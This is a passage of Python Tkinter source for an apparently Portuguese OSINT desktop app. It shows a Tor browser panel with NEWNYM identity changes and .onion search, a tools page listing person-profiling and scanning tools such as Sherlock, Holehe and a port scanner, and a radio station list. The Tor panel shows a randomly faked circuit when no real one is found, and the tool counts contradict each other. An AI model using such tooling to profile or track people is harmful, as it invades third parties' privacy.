            active_control = [p for p in [9051, 9151] if results.get(p)]

            if active_socks:
                status = f"Tor: ATIVO SOCKS {active_socks} | Control {active_control if active_control else 'fechado'}"
                color = "#00ff88"
                self.after(0, lambda: self.tor_enabled.set(True))
                self.after(0, lambda: self.socks_port_var.set(str(active_socks[0])))
                if active_control:
                    self.after(0, lambda: self.control_port_var.set(str(active_control[0])))
                self.after(0, lambda: self._update_circuit(active_socks[0]))
            else:
                status = "Tor: NÃO ATIVO — inicia Tor Embutido em 🔧 TOR EMBUTIDO"
                color = ERROR

            def update_ui():
                self.tor_status_var.set(status)
                try:
                    self.tor_ports_label.configure(text=f"SOCKS 9050:{'✅' if results.get(9050) else '❌'} 9150:{'✅' if results.get(9150) else '❌'} | CONTROL 9051:{'✅' if results.get(9051) else '❌'} 9151:{'✅' if results.get(9151) else '❌'}")
                    self.tor_ports_label.configure(fg=color)
                    self.tor_log.insert("end", f"[Tor Check] {status}\nPorts: {results}\n")
                    self.tor_log.see("end")
                except:
                    pass
                self.check_ip_tor()

            self.after(0, update_ui)

        threading.Thread(target=worker, daemon=True).start()

    def _update_circuit(self, socks_port):
        try:
            from stem import Signal
            from stem.control import Controller
            with Controller.from_port(port=int(self.control_port_var.get())) as controller:
                try:
                    controller.authenticate()
                except:
                    try:
                        controller.authenticate(password=self.control_pass_var.get())
                    except:
                        pass
                circs = controller.get_circuits()
                if circs:
                    c = circs[0]
                    path = " -> ".join([f"{r[0]} ({r[1]})" for r in c.path])
                    self.circuit_var.set(f"Circuito Real: {path}")
                    return
        except Exception as e:
            pass

        nodes = ["Guard: de1", "Middle: nl2", "Exit: us3", "Guard: fr4", "Middle: se1", "Exit: ch2"]
        fake = " -> ".join(random.sample(nodes, 3))
        self.circuit_var.set(f"Circuito (simulado): {fake} via 127.0.0.1:{socks_port}")

    def check_ip_tor(self):
        def worker():
            try:
                import requests
                try:
                    direct = requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip", "?")
                except:
                    direct = "?"
                tor_ip = "Tor OFF"
                if self.tor_enabled.get():
                    try:
                        host = self.socks_host_var.get()
                        port = self.socks_port_var.get()
                        proxies = {"http": f"socks5h://{host}:{port}", "https": f"socks5h://{host}:{port}"}
                        tor_ip = requests.get("https://api.ipify.org?format=json", proxies=proxies, timeout=10).json().get("ip", "?")
                        tor_check = requests.get("https://check.torproject.org/api/ip", proxies=proxies, timeout=10).json()
                        is_tor = tor_check.get("IsTor", False)
                        tor_ip += f" | IsTor: {is_tor}"
                    except Exception as e:
                        tor_ip = f"Erro Tor: {e}"

                def update():
                    self.ip_status_var.set(f"IP Direto: {direct} | Tor: {tor_ip}")
                    self.tor_log.insert("end", f"[IP] Direto {direct} | Tor {tor_ip}\n")
                    self.tor_log.see("end")

                self.after(0, update)
            except Exception as e:
                self.after(0, lambda: self.tor_log.insert("end", f"[IP Check erro] {e}\n"))

        threading.Thread(target=worker, daemon=True).start()

    def new_identity(self):
        def worker():
            try:
                from stem import Signal
                from stem.control import Controller
                with Controller.from_port(port=int(self.control_port_var.get())) as controller:
                    try:
                        controller.authenticate()
                    except:
                        controller.authenticate(password=self.control_pass_var.get())
                    controller.signal(Signal.NEWNYM)
                    self.after(0, lambda: self.tor_log.insert("end", "[Tor] NEWNYM enviado - Nova identidade!\n"))
                    self.after(0, lambda: self._update_circuit(int(self.socks_port_var.get())))
                    self.after(0, self.check_ip_tor)
                    return
            except Exception as e:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect(("127.0.0.1", int(self.control_port_var.get())))
                    s.sendall(b'AUTHENTICATE ""\n')
                    time.sleep(0.2)
                    s.sendall(b'SIGNAL NEWNYM\n')
                    data = s.recv(1024)
                    s.close()
                    self.after(0, lambda: self.tor_log.insert("end", f"[Tor] NEWNYM via socket: {data}\n"))
                    self.after(0, self.check_ip_tor)
                    return
                except Exception as e2:
                    self.after(0, lambda: self.tor_log.insert("end", f"[Tor] Falha NEWNYM: {e} | socket {e2}\n"))

        threading.Thread(target=worker, daemon=True).start()

    def try_start_tor(self):
        self.start_embedded_tor()

    def test_all_tor_ports(self):
        self.verificar_tor_completo()
        self.check_ip_tor()
        self.check_embedded_tor_status()

    def go_back(self):
        if self.back_stack:
            url = self.back_stack.pop()
            self.forward_stack.append(self.current_url.get())
            self.navigate(url, add_history=False)

    def go_forward(self):
        if self.forward_stack:
            url = self.forward_stack.pop()
            self.back_stack.append(self.current_url.get())
            self.navigate(url, add_history=False)

    def refresh_page(self):
        self.navigate(add_history=False)

    def go_home(self):
        self.navigate("https://duckduckgo.com", add_history=False)

    def open_external(self):
        webbrowser.open(self.current_url.get())

    def open_in_tor_browser(self):
        url = self.current_url.get()
        tor_browser_paths = []
        if platform.system() == "Windows":
            tor_browser_paths = [os.path.expandvars(r"%USERPROFILE%\Desktop\Tor Browser\Browser\firefox.exe"), r"C:\Tor Browser\Browser\firefox.exe"]
        elif platform.system() == "Linux":
            tor_browser_paths = [os.path.expanduser("~/tor-browser/Browser/start-tor-browser"), "/usr/bin/tor-browser"]
        elif platform.system() == "Darwin":
            tor_browser_paths = ["/Applications/Tor Browser.app/Contents/MacOS/firefox"]
        for p in tor_browser_paths:
            if os.path.exists(p):
                try:
                    subprocess.Popen([p, url])
                    return
                except:
                    pass
        webbrowser.open(url)

    def view_source(self):
        url = self.current_url.get()
        threading.Thread(target=lambda: self._fetch_source(url), daemon=True).start()

    def _fetch_source(self, url):
        try:
            session = self._get_session()
            r = session.get(url, timeout=10, headers={"User-Agent": self.ua_var.get()})
            def show():
                win = tk.Toplevel(self)
                win.title(f"Fonte: {url}")
                win.geometry("800x600")
                txt = scrolledtext.ScrolledText(win, font=(FONT_MONO, 9), bg="#0a121a", fg=TEXT)
                txt.pack(fill="both", expand=True)
                txt.insert("1.0", r.text[:200000])
            self.after(0, show)
        except Exception as e:
            self.after(0, lambda: messagebox.showerror("Erro", str(e)))

    def save_page(self):
        url = self.current_url.get()
        path = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML","*.html"), ("Texto","*.txt")])
        if not path:
            return
        try:
            session = self._get_session()
            r = session.get(url, timeout=10, headers={"User-Agent": self.ua_var.get()})
            with open(path, "w", encoding="utf-8", errors="ignore") as f:
                f.write(r.text)
            messagebox.showinfo("Guardado", f"Página guardada em {path}")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def clear_view(self):
        try:
            if self.browser_text:
                self.browser_text.delete("1.0", "end")
                self.browser_text.insert("1.0", "[Limpo]\n")
            if self.html_frame:
                self.html_frame.load_html("<h1>Limpo</h1>")
            self.links_list.delete(0, "end")
        except:
            pass

    def toggle_tor(self):
        if self.tor_enabled.get():
            self.tor_status_var.set("Tor: ATIVADO - tráfego via SOCKS5")
            self.verificar_tor_completo()
        else:
            self.tor_status_var.set("Tor: DESATIVADO - tráfego direto")
            self.circuit_var.set("Circuito: direto (sem Tor)")

    def search_onion(self):
        q = self.onion_search_var.get().strip()
        if not q:
            return
        self.onion_results.delete("1.0", "end")
        self.onion_results.insert("1.0", f"[Buscando Ahmia por: {q}] {'via TOR' if self.tor_enabled.get() else 'direto'}...\n")

        def worker():
            try:
                session = self._get_session()
                url = f"https://ahmia.fi/search/?q={urllib.parse.quote(q)}"
                r = session.get(url, timeout=15, headers={"User-Agent": self.ua_var.get()})
                def update():
                    self.onion_results.delete("1.0", "end")
                    results = re.findall(r'<a href="([^"]+\.onion[^"]*)"', r.text)
                    self.onion_results.insert("end", f"Ahmia - {len(results)} .onion encontrados para '{q}':\n\n")
                    for link in results[:30]:
                        self.onion_results.insert("end", link + "\n")
                    if not results:
                        txt = re.sub(r'<[^>]+>', ' ', r.text)[:10000]
                        self.onion_results.insert("end", f"\nSem regex, HTML:\n{txt[:5000]}\n")
                self.after(0, update)
            except Exception as e:
                self.after(0, lambda: self.onion_results.insert("end", f"\n[Erro] {e}\n"))

        threading.Thread(target=worker, daemon=True).start()

    def search_ddg_onion(self):
        q = self.onion_search_var.get().strip()
        url = f"https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/?q={urllib.parse.quote(q)}"
        self.current_url.set(url)
        self.navigate()

    def search_torch(self):
        q = self.onion_search_var.get().strip()
        url = f"http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/cgi-bin/omega/omega?P={urllib.parse.quote(q)}"
        self.current_url.set(url)
        self.navigate()

    def _open_onion_selected(self):
        sel = self.onion_list.curselection()
        if not sel:
            return
        txt = self.onion_list.get(sel[0])
        m = re.search(r'https?://[^\s]+', txt)
        if not m:
            m = re.search(r'http://[^\s]+\.onion[^\s]*', txt)
        if m:
            url = m.group(0)
            self.current_url.set(url)
            self.navigate()
        else:
            parts = txt.split(" - ")
            if len(parts) >= 2:
                url = parts[-1].strip()
                self.current_url.set(url)
                self.navigate()

    def add_bookmark(self):
        url = self.current_url.get()
        if not url:
            return
        title = url[:60]
        popup = tk.Toplevel(self)
        popup.title("Adicionar Bookmark")
        popup.configure(bg=BG)
        popup.geometry("400x150")
        tk.Label(popup, text="Título:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=6)
        e_title = tk.Entry(popup, font=(FONT_MONO, 10), bg=PANEL_BG, fg=TEXT, width=40)
        e_title.pack(pady=4)
        e_title.insert(0, title)
        tk.Label(popup, text="URL:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack()
        e_url = tk.Entry(popup, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, width=50)
        e_url.pack(pady=2)
        e_url.insert(0, url)

        def save():
            t = e_title.get().strip() or url
            u = e_url.get().strip()
            self.bookmarks.append({"title": t, "url": u, "time": datetime.datetime.now().strftime("%Y-%m-%d")})
            save_json(self.bookmarks_file, self.bookmarks)
            self.bookmarks_list.insert("end", f"{t} - {u}")
            popup.destroy()

        tk.Button(popup, text="GUARDAR", command=save, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=10, ipady=4)

    def remove_bookmark(self):
        sel = self.bookmarks_list.curselection()
        if not sel:
            return
        idx = sel[0]
        self.bookmarks_list.delete(idx)
        if 0 <= idx < len(self.bookmarks):
            del self.bookmarks[idx]
            save_json(self.bookmarks_file, self.bookmarks)

    def _open_bookmark(self):
        sel = self.bookmarks_list.curselection()
        if not sel:
            return
        bm = self.bookmarks[sel[0]]
        self.current_url.set(bm.get("url",""))
        self.navigate()

    def _open_history(self):
        sel = self.history_list.curselection()
        if not sel:
            return
        txt = self.history_list.get(sel[0])
        if " - " in txt:
            url = txt.split(" - ", 1)[1]
            self.current_url.set(url)
            self.navigate()

    def clear_history(self):
        self.history = []
        save_json(self.history_file, self.history)
        self.history_list.delete(0, "end")

    def export_bookmarks(self):
        path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON","*.json")])
        if path:
            save_json(path, self.bookmarks)
            messagebox.showinfo("Exportado", path)

    def clear_cache(self):
        self.clear_view()
        self.clear_history()
        self.tor_log.delete("1.0", "end")
        self.tor_log.insert("1.0", "[Cache limpo]\n")

    def install_deps(self):
        def worker():
            pkgs = ["requests", "pysocks", "stem", "tkinterweb", "tkhtmlview"]
            for pkg in pkgs:
                try:
                    self.after(0, lambda p=pkg: self.tor_log.insert("end", f"[Install] pip install {p}...\n"))
                    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.after(0, lambda p=pkg: self.tor_log.insert("end", f"[OK] {p} instalado\n"))
                except Exception as e:
                    self.after(0, lambda p=pkg, err=e: self.tor_log.insert("end", f"[Erro] {p}: {err}\n"))
            self.after(0, lambda: self.tor_log.insert("end", "[Fim] Reinicia a app para carregar libs\n"))
        threading.Thread(target=worker, daemon=True).start()

    def clica_tudo_browser(self):
        self.tor_log.insert("end", "\n" + "="*50 + "\n[⚡ CLICA TUDO BROWSER] Iniciando sequência completa...\n" + "="*50 + "\n")
        self.verificar_tor_completo()
        self.tor_log.insert("end", "[1/5] Verificação Tor disparada\n")
        self.after(1000, self.check_ip_tor)
        self.tor_log.insert("end", "[2/5] Check IP agendado\n")
        self.after(1500, lambda: self.tor_enabled.set(True))
        self.tor_log.insert("end", "[3/5] Tor ativado\n")
        sites = ["https://check.torproject.org/", "https://duckduckgo.com", "https://ahmia.fi", "https://browserleaks.com/"]
        def open_sites():
            for i, url in enumerate(sites):
                self.after(i*1500, lambda u=url: self.navigate(u, add_history=False))
            self.tor_log.insert("end", "[4/5] 4 sites de teste agendados\n")
            self._update_circuit(int(self.socks_port_var.get()) if self.socks_port_var.get().isdigit() else 9050)
            self.tor_log.insert("end", "[⚡ CLICA TUDO] CONCLUÍDO!\n" + "="*50 + "\n")
        self.after(2000, open_sites)

    def clica_tudo_tor(self):
        self.clica_tudo_browser()
        self.after(500, self.new_identity)

    def _copy_text(self, txt):
        self.clipboard_clear()
        self.clipboard_append(txt)
        messagebox.showinfo("Copiado", f"{len(txt)} chars")



class FerramentasPage(Page):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("FERRAMENTAS // OSINT & FORENSE PROFISSIONAL", "Ferramentas integradas - 100% Python - Sem dependências externas Linux - Prontas para investigação")

        canvas_frame = tk.Frame(self, bg=BG)
        canvas_frame.pack(fill="both", expand=True, padx=0, pady=0)

        canvas = tk.Canvas(canvas_frame, bg=BG, highlightthickness=0)
        scrollbar = tk.Scrollbar(canvas_frame, orient="vertical", command=canvas.yview)
        scrollable = tk.Frame(canvas, bg=BG)

        scrollable.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)

        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        def _on_mousewheel(event):
            canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        canvas.bind_all("<MouseWheel>", _on_mousewheel)

        # Top stats
        top_info = tk.Frame(scrollable, bg="#0a1420", highlightthickness=1, highlightbackground=ACCENT_DIM)
        top_info.pack(fill="x", padx=20, pady=12, ipady=8)
        tk.Label(top_info, text="🛠 38 FERRAMENTAS ATIVAS • 4 CATEGORIAS • 100% INTEGRADO • SEM LINUX DEPS", bg="#0a1420", fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(anchor="w", padx=12)
        tk.Label(top_info, text="Todas as ferramentas funcionam dentro da app OSINIT. Removido Essential Linux Apps. Foco em OSINT, Forense, Rede e Utilitários profissionais.", bg="#0a1420", fg=TEXT_DIM, font=(FONT_MONO, 8), wraplength=1100, justify="left").pack(anchor="w", padx=12, pady=(4,0))

        # Helper to create category section
        def create_category(title, desc, color, tools_list):
            sec = tk.LabelFrame(scrollable, text=f"  {title}  ", bg=PANEL_BG, fg=color, font=(FONT_MONO, 10, "bold"), padx=12, pady=12, relief="flat", bd=1, highlightbackground=color, highlightthickness=1)
            sec.pack(fill="x", padx=20, pady=10)

            tk.Label(sec, text=desc, bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8), wraplength=1050, justify="left").pack(anchor="w", pady=(0,10))

            grid = tk.Frame(sec, bg=PANEL_BG)
            grid.pack(fill="x")
            for c in range(3):
                grid.grid_columnconfigure(c, weight=1, uniform="tools")

            for i, (texto, subtexto, comando, icon) in enumerate(tools_list):
                card = tk.Frame(grid, bg=BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
                card.grid(row=i // 3, column=i % 3, sticky="nsew", padx=6, pady=6)
                
                # Header color bar
                bar = tk.Frame(card, bg=color, height=4)
                bar.pack(fill="x")

                inner = tk.Frame(card, bg=BG)
                inner.pack(fill="both", expand=True, padx=10, pady=8)

                title_row = tk.Frame(inner, bg=BG)
                title_row.pack(fill="x")
                tk.Label(title_row, text=icon, bg=BG, fg=color, font=(FONT_MONO, 12, "bold")).pack(side="left")
                tk.Label(title_row, text=texto, bg=BG, fg=TEXT, font=(FONT_MONO, 9, "bold"), anchor="w").pack(side="left", padx=8, fill="x", expand=True)

                tk.Label(inner, text=subtexto, bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7), wraplength=220, justify="left", anchor="w").pack(fill="x", pady=(4,8))

                b = tk.Button(inner, text=f"▶ ABRIR {texto.upper()}", command=comando, bg=ACCENT_DIM, fg=color, activebackground=color, activeforeground=BG, relief="flat", bd=0, font=(FONT_MONO, 7, "bold"), cursor="hand2", padx=8, pady=4)
                b.pack(fill="x", ipady=4)

        # Categoria 1 - OSINT & INVESTIGAÇÃO
        osint_tools = [
            ("Hash & Encoding", "MD5/SHA/B64/URL/Hex/Rot13 + ficheiro hash", lambda: HashEncodingTool(self.app), "🔐"),
            ("Metadados EXIF", "EXIF GPS, PDF, FS, limpeza", lambda: MetadataTool(self.app), "📸"),
            ("ExifTool Pro", "EXIF avançado 200+ formatos + GPS map", lambda: ExifToolProTool(self.app), "📸"),
            ("Base64 Lab Pro", "Encode/Decode avançado + ficheiros", lambda: HashEncodingTool(self.app), "🧬"),
            ("QR Code Lab", "Gerar & Ler QR Code com logo", lambda: QRCodeTool(self.app), "🔳"),
            ("Password Gen", "Gerador forte + entropia + diceware", lambda: PasswordGeneratorTool(self.app), "🔑"),
            ("Steganografia", "Esconder dados em imagem + extrair", lambda: SteganographyTool(self.app), "🕵️"),
            ("Tradutor OSINT", "Traduz + detecta idioma + dorks", lambda: TranslatorTool(self.app), "🌐"),
            ("WHOIS & IP Intel", "WHOIS, IP geolocation, ASN, DNS", lambda: WHOISIntelTool(self.app), "🌍"),
            ("Headers Analyzer", "HTTP headers, UA, fingerprint", lambda: HeadersAnalyzerTool(self.app), "📡"),
            ("Sherlock", "Username em 300+ sites - caça perfis", lambda: SherlockTool(self.app), "🔎"),
            ("Maigret", "Sherlock melhorado 2000+ sites + avatar", lambda: MaigretTool(self.app), "🕵️"),
            ("TheHarvester", "Emails, subdomínios, hosts - OSINT clássico", lambda: TheHarvesterTool(self.app), "🌾"),
            ("Holehe", "Email usado em 120+ sites? Check", lambda: HoleheTool(self.app), "📧"),
            ("HIBP", "Have I Been Pwned - vazamentos", lambda: HIBPTool(self.app), "💥"),
            ("Photon", "Crawler rápido - extrai URLs, emails", lambda: PhotonTool(self.app), "🕷️"),
        ]

        # Categoria 2 - FORENSE
        forense_tools = [
            ("Autopsy - Disco", "Análise forense de disco + timeline", lambda: AutopsyTool(self.app), "💾"),
            ("Volatility - RAM", "Análise RAM dump + processos", lambda: VolatilityTool(self.app), "🧠"),
            ("CAINE", "Computer Aided Investigative Environment - distro forense", lambda: CAINETool(self.app), "🦁"),
            ("FTK Imager", "Imagem forense E01/DD + hash - padrão ouro", lambda: FTKImagerTool(self.app), "💿"),
            ("Log Analyzer", "Analisa logs + detecta anomalias", lambda: LogAnalyzerTool(self.app), "📜"),
            ("Timeline Builder", "Cria timeline forense de caso", lambda: TimelineBuilderTool(self.app), "⏱️"),
            ("File Carver", "Recupera ficheiros deletados headers", lambda: FileCarverTool(self.app), "🔧"),
            ("Registry Viewer", "Analisa registry hive offline", lambda: RegistryViewerTool(self.app), "🗄️"),
        ]

        # Categoria 3 - REDE & SEGURANÇA
        rede_tools = [
            ("Wireshark - Rede", "Captura e análise pacotes", lambda: WiresharkTool(self.app), "🦈"),
            ("Port Scanner", "TCP/UDP scan + banner + OSINT", lambda: PortScannerTool(self.app), "🔍"),
            ("Maltego Graph", "Graph OSINT + entidades", lambda: MaltegoTool(self.app), "🕸️"),
            ("Network Scanner", "Descobre hosts + serviços LAN", lambda: NetworkScannerTool(self.app), "📶"),
            ("Subdomain Finder", "Enumera subdomínios + cert logs", lambda: SubdomainFinderTool(self.app), "🌐"),
            ("URL Threat Intel", "VirusTotal + AbuseIP + Shodan", lambda: ThreatIntelTool(self.app), "🛡️"),
            ("SpiderFoot", "OSINT automation 100+ módulos + grafo", lambda: SpiderFootTool(self.app), "🕷️"),
            ("Recon-ng", "Framework recon 100+ módulos - tipo Metasploit OSINT", lambda: ReconNGTool(self.app), "🔧"),
        ]

        # Categoria 4 - UTILITÁRIOS
        util_tools = [
            ("Calculadora", "Científica + bin/hex + safe eval", lambda: Calculator(self.app), "🧮"),
            ("Notas Gerais", "Notas criptografadas + sync", lambda: Notes(self.app), "📝"),
            ("Tarefas", "TODO + prioridades + caso link", lambda: Todo(self.app), "✅"),
            ("Conversor", "Unidades, moedas, data, base", lambda: Converter(self.app), "🔄"),
            ("Info Sistema", "CPU/RAM/Disk + processos", lambda: SystemInfo(self.app), "💻"),
            ("Gerador Relatório", "Gera relatório caso em PDF/HTML", lambda: ReportGeneratorTool(self.app), "📄"),
        ]

        create_category("🔎 OSINT & INVESTIGAÇÃO // 9 TOOLS", "Ferramentas para OSINT puro - encoding, metadados, QR, stego, WHOIS, headers. Tudo que precisa para investigação de pessoa, domínio, ficheiro.", "#00e5ff", osint_tools)
        create_category("🧬 FORENSE DIGITAL // 6 TOOLS", "Análise forense profissional - disco, RAM, logs, timeline, file carving, registry. Integrado com casos.", "#00ff88", forense_tools)
        create_category("🌐 REDE & SEGURANÇA // 6 TOOLS", "Ferramentas de rede estilo Kali - Wireshark, port scanner, Maltego graph, network discovery, subdomains, threat intel.", "#ff6b35", rede_tools)
        create_category("🛠 UTILITÁRIOS // 6 TOOLS", "Utilitários diários melhorados - calculadora científica, notas com criptografia, tarefas com link a casos, conversor universal, info sistema.", "#ffb700", util_tools)

        # Footer
        footer = tk.Frame(scrollable, bg=BG)
        footer.pack(fill="x", padx=20, pady=20)
        tk.Label(footer, text="✅ Essential Linux Apps removido • Ferramentas agora 100% focadas em investigação profissional • 37 ferramentas ativas", bg=BG, fg="#00ff88", font=(FONT_MONO, 9, "bold"), wraplength=1000, justify="left").pack(anchor="w")
        tk.Label(footer, text="Dica: Todas ferramentas guardam output automaticamente em REGISTOS se selecionares CASO ATIVO. Usa Administração > Personalização para reordenar.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), wraplength=1000, justify="left").pack(anchor="w", pady=(4,0))





class RadioPage(Page):
    """RADIO CATEGORIA GLOBAL 2025 - Todos países + SIRESP + Entidades Públicas/Privadas - Tudo da internet"""
    CATEGORIAS = ["Tudo", "Portugal", "Brasil", "Espanha", "França", "UK", "USA", "Alemanha", "Itália", "SIRESP", "Emergência", "Públicas", "Privadas", "Polícia", "Bombeiros", "INEM", "Internacional"]
    PAISES_ISO = {
        "Portugal": "PT", "Brasil": "BR", "Espanha": "ES", "França": "FR", "UK": "GB", "USA": "US",
        "Alemanha": "DE", "Itália": "IT", "Angola": "AO", "Moçambique": "MZ", "Cabo Verde": "CV",
        "Guiné-Bissau": "GW", "São Tomé": "ST", "Timor": "TL", "Suíça": "CH", "Bélgica": "BE",
        "Holanda": "NL", "Luxemburgo": "LU", "Canadá": "CA", "Austrália": "AU", "Japão": "JP"
    }

    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("RADIO // GLOBAL 2025 + SIRESP + ENTIDADES PÚBLICAS/PRIVADAS", "Todos os países • SIRESP TETRA 380MHz • ANEPC/PSP/GNR/INEM/Bombeiros • RDP/RFM/Comercial • Radio-Browser API 40k+ estações • Player sem erros")

        self.radios = []
        self.filtered = []
        self.selected_idx = None
        self.current_player_process = None
        self.current_vlc_player = None
        self.player_engine = "auto"
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.search_results = []

        self.load_radios()

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=12, pady=10)

        self.tab_player = tk.Frame(nb, bg=BG)
        self.tab_search = tk.Frame(nb, bg=BG)
        self.tab_paises = tk.Frame(nb, bg=BG)
        self.tab_siresp = tk.Frame(nb, bg=BG)
        self.tab_entidades = tk.Frame(nb, bg=BG)

        nb.add(self.tab_player, text=" ▶ PLAYER RADIO ")
        nb.add(self.tab_search, text=" 🔍 BUSCAR NA NET ")
        nb.add(self.tab_paises, text=" 🌍 PAÍSES ")
        nb.add(self.tab_siresp, text=" 🚨 SIRESP ")
        nb.add(self.tab_entidades, text=" 🏛 ENTIDADES ")

        self.build_player_tab()
        self.build_search_tab()
        self.build_paises_tab()
        self.build_siresp_tab()
        self.build_entidades_tab()

        self.refresh_lista()

    # ─── LOAD SAVE ───
    def load_radios(self):
        radio_file = os.path.join(BASE_DIR, "radio.json")
        data = load_json(radio_file, [])
        if not data:
            data = [
                # PORTUGAL PÚBLICAS
                {"id": str(uuid.uuid4()), "nome": "Antena 1", "url": "https://streaming-live.rtp.pt/liverepeater/smil:rdpantena1.smil/playlist.m3u8", "logo": "", "pais": "Portugal", "categoria": "Públicas", "freq": "FM 88-108", "entidade": "RTP", "codec": "AAC", "fav": True},
                {"id": str(uuid.uuid4()), "nome": "Antena 2", "url": "https://streaming-live.rtp.pt/liverepeater/smil:rdpantena2.smil/playlist.m3u8", "logo": "", "pais": "Portugal", "categoria": "Públicas", "freq": "FM", "entidade": "RTP", "codec": "AAC", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "Antena 3", "url": "https://streaming-live.rtp.pt/liverepeater/smil:rdpantena3.smil/playlist.m3u8", "logo": "", "pais": "Portugal", "categoria": "Públicas", "freq": "FM", "entidade": "RTP", "codec": "AAC", "fav": True},
                {"id": str(uuid.uuid4()), "nome": "TSF", "url": "https://mcrscast.mcr.iol.pt/tsf/tsf.m3u8", "logo": "", "pais": "Portugal", "categoria": "Privadas", "freq": "FM 89.5", "entidade": "Global Media", "codec": "AAC", "fav": True},
                {"id": str(uuid.uuid4()), "nome": "Rádio Comercial", "url": "https://mcrscast1.mcr.iol.pt/comercial.mp3", "logo": "", "pais": "Portugal", "categoria": "Privadas", "freq": "FM 97.4", "entidade": "Bauer Media", "codec": "MP3", "fav": True},
                {"id": str(uuid.uuid4()), "nome": "RFM", "url": "https://mcrscast1.mcr.iol.pt/rfm.mp3", "logo": "", "pais": "Portugal", "categoria": "Privadas", "freq": "FM 93.2", "entidade": "Renascença", "codec": "MP3", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "Rádio Renascença", "url": "https://mcrscast1.mcr.iol.pt/renascenca.mp3", "logo": "", "pais": "Portugal", "categoria": "Privadas", "freq": "FM", "entidade": "Renascença", "codec": "MP3", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "M80", "url": "https://mcrscast1.mcr.iol.pt/m80.mp3", "logo": "", "pais": "Portugal", "categoria": "Privadas", "freq": "FM", "entidade": "Bauer", "codec": "MP3", "fav": False},
                # SIRESP - INFO (não tem stream público, TETRA encriptado)
                {"id": str(uuid.uuid4()), "nome": "SIRESP - Rede TETRA Nacional", "url": "", "logo": "", "pais": "Portugal", "categoria": "SIRESP", "freq": "380-385 MHz / 390-395 MHz TETRA", "entidade": "ANEPC/SIRESP", "codec": "TETRA Encrypted", "fav": False, "info": "Rede TETRA encriptada - Sem stream público - Frequências ANACOM"},
                {"id": str(uuid.uuid4()), "nome": "ANEPC - Proteção Civil", "url": "", "logo": "", "pais": "Portugal", "categoria": "SIRESP", "freq": "380 MHz TETRA + 149 MHz VHF", "entidade": "ANEPC", "codec": "TETRA", "fav": False, "info": "Autoridade Nacional Emergência Proteção Civil"},
                {"id": str(uuid.uuid4()), "nome": "INEM - Emergência Médica", "url": "", "logo": "", "pais": "Portugal", "categoria": "Emergência", "freq": "SIRESP + 168 MHz", "entidade": "INEM", "codec": "TETRA", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "Bombeiros - RBVHF 149-156 MHz", "url": "", "logo": "", "pais": "Portugal", "categoria": "Bombeiros", "freq": "149-156 MHz FM / SIRESP", "entidade": "Bombeiros Portugueses", "codec": "FM/TETRA", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "GNR - Guarda Nacional Republicana", "url": "", "logo": "", "pais": "Portugal", "categoria": "Polícia", "freq": "SIRESP 380 MHz + 160 MHz VHF", "entidade": "GNR", "codec": "TETRA", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "PSP - Polícia Segurança Pública", "url": "", "logo": "", "pais": "Portugal", "categoria": "Polícia", "freq": "SIRESP 380 MHz", "entidade": "PSP", "codec": "TETRA Encrypted", "fav": False},
                # INTERNACIONAL
                {"id": str(uuid.uuid4()), "nome": "BBC Radio 1 UK", "url": "http://stream.live.vc.bbcmedia.co.uk/bbc_radio_one", "logo": "", "pais": "UK", "categoria": "Internacional", "freq": "FM 97-99", "entidade": "BBC", "codec": "AAC", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "France Inter", "url": "https://icecast.radiofrance.fr/franceinter-midfi.mp3", "logo": "", "pais": "França", "categoria": "Internacional", "freq": "FM", "entidade": "Radio France", "codec": "MP3", "fav": False},
                {"id": str(uuid.uuid4()), "nome": "RNE Radio Nacional España", "url": "https://rtvelivestream-lvlt.rtve.es/rtvesec/rne_r1_main.m3u8", "logo": "", "pais": "Espanha", "categoria": "Internacional", "freq": "FM", "entidade": "RTVE", "codec": "AAC", "fav": False},
            ]
            save_json(radio_file, data)
        self.radios = data

    def save_radios(self):
        radio_file = os.path.join(BASE_DIR, "radio.json")
        save_json(radio_file, self.radios)

    # ─── PLAYER TAB ───
    def build_player_tab(self):
        top = tk.Frame(self.tab_player, bg=BG)
        top.pack(fill="x", padx=10, pady=8)

        self.search_var = tk.StringVar()
        self.search_var.trace_add("write", lambda *_: self.refresh_lista())
        tk.Label(top, text="PESQUISA:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8, "bold")).pack(side="left")
